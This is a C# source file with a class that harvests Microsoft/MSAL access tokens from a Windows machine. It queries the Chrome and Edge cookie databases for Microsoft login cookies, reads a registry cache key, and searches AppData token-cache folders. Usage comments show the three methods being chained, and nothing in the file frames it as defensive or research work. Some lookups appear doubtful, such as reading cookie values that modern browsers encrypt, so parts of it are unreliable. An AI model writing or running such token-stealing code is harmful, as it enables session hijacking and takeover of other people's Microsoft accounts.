using System;
using System.IO;
using System.Text.Json;
using Microsoft.Data.Sqlite;
using System.Collections.Generic;

public class BrowserTokenExtractor
{
    // Chrome/Edge LocalStorage path
    private static readonly string ChromeStoragePath = 
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
        @"Google\Chrome\User Data\Default\Local Storage\leveldb");
    
    private static readonly string EdgeStoragePath = 
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
        @"Microsoft\Edge\User Data\Default\Local Storage\leveldb");

    // Read Chrome/Edge cookies for MSAL tokens
    public static string ExtractFromChromeCookies()
    {
        try
        {
            string cookiesPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                @"Google\Chrome\User Data\Default\Cookies");

            if (!File.Exists(cookiesPath))
            {
                // Try Edge
                cookiesPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    @"Microsoft\Edge\User Data\Default\Cookies");
            }

            if (File.Exists(cookiesPath))
            {
                using (var connection = new SqliteConnection($"Data Source={cookiesPath}"))
                {
                    connection.Open();
                    var command = new SqliteCommand(
                        "SELECT name, value, host_key FROM cookies WHERE host_key LIKE '%microsoft%' OR host_key LIKE '%login.microsoftonline%'", 
                        connection);
                    
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string name = reader["name"].ToString();
                            string value = reader["value"].ToString();
                            
                            // Look for MSAL-related cookies
                            if (name.Contains("MSAL") || name.Contains("access_token"))
                            {
                                return value;
                            }
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error reading browser cookies: {ex.Message}");
        }
        
        return null;
    }

    // Read from Windows Registry (some apps store tokens here)
    public static string ExtractFromRegistry(string clientId)
    {
        try
        {
            using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\IdentityStore\Cache"))
            {
                if (key != null)
                {
                    foreach (string subKeyName in key.GetSubKeyNames())
                    {
                        if (subKeyName.Contains(clientId))
                        {
                            using (var subKey = key.OpenSubKey(subKeyName))
                            {
                                var tokenValue = subKey?.GetValue("access_token")?.ToString();
                                if (!string.IsNullOrEmpty(tokenValue))
                                {
                                    return tokenValue;
                                }
                            }
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error reading registry: {ex.Message}");
        }
        
        return null;
    }

    // Read from file system cache (common locations)
    public static string ExtractFromFileCache(string clientId, string username = null)
    {
        var possiblePaths = new List<string>
        {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), 
                "Microsoft", "TokenCache"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), 
                "Microsoft", "TokenCache"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), 
                ".IdentityService"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), 
                ".IdentityService")
        };

        foreach (string basePath in possiblePaths)
        {
            if (Directory.Exists(basePath))
            {
                var files = Directory.GetFiles(basePath, "*", SearchOption.AllDirectories);
                foreach (string file in files)
                {
                    try
                    {
                        if (Path.GetFileName(file).Contains(clientId) || 
                            Path.GetFileName(file).Contains("msal"))
                        {
                            string content = File.ReadAllText(file);
                            if (content.Contains("access_token"))
                            {
                                // Parse JSON to extract token
                                using (JsonDocument doc = JsonDocument.Parse(content))
                                {
                                    if (doc.RootElement.TryGetProperty("access_token", out JsonElement token))
                                    {
                                        return token.GetString();
                                    }
                                }
                            }
                        }
                    }
                    catch
                    {
                        // Continue to next file
                        continue;
                    }
                }
            }
        }
        
        return null;
    }
}

// Usage:
// string token = BrowserTokenExtractor.ExtractFromChromeCookies();
// if (string.IsNullOrEmpty(token))
//     token = BrowserTokenExtractor.ExtractFromRegistry("your-client-id");
// if (string.IsNullOrEmpty(token))
//     token = BrowserTokenExtractor.ExtractFromFileCache("your-client-id", "user@domain.com");